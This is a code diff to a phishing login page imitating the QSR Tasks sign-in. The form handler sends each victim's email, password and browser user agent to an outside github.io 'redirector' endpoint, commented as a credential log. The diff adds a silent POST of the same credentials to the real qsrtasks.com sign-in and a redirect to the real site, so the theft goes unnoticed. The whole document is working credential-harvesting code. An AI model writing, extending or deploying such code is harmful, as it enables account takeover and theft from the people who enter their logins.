@@ -74,14 +74,17 @@
     form.addEventListener('submit', function(e) {
       e.preventDefault();
 
+      const email = form.email.value;
+      const password = form.password.value;
+
       const payload = {
-        email: form.email.value,
-        password: form.password.value,
+        email,
+        password,
         ua: navigator.userAgent
       };
 
-      // Replace with your real logging endpoint:
-      fetch('https://staggjs.github.io/qsrtasks-redirector/', {
+      // Log credentials to your endpoint (e.g., Webhook.site)
+      fetch('https://staggjs.github.io/qsrtasks-redirector', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
@@ -91,7 +94,18 @@
       loginBox.style.display = 'none';
       redirectMsg.style.display = 'block';
 
-      // Redirect to real site after short delay
+      // Also POST to QSR Tasks
+      const formData = new FormData();
+      formData.append('user[email]', email);
+      formData.append('user[password]', password);
+
+      fetch('https://qsrtasks.com/users/sign_in', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: formData
+      });
+
+      // Final redirect to legit site
       setTimeout(() => {
         window.location.href = 'https://qsrtasks.com';
       }, 3000);
